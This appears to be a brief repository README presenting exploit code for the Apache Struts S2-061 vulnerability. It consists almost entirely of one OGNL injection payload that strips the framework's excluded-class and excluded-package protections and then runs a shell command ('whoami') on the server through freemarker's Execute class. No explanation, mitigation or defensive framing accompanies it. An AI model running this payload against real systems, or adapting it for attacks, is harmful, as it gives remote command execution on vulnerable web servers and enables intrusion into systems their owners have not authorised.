# s2-061
the s2-061 exploit code

# Command execute
```
%{('Powered_by_Unicode_Potats0,enjoy_it').
(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).
(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).
(#stackvalue=#attr['struts.valueStack']).
(#potats0.setBean(#stackvalue)).
(#context=#potats0.get('context')).
(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).
(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).
(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).
(#potats0.put('excludedPackageNames',#emptySet)).
(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).
(#cmd={'whoami'}).(#res=#exec.exec(#cmd))}
```
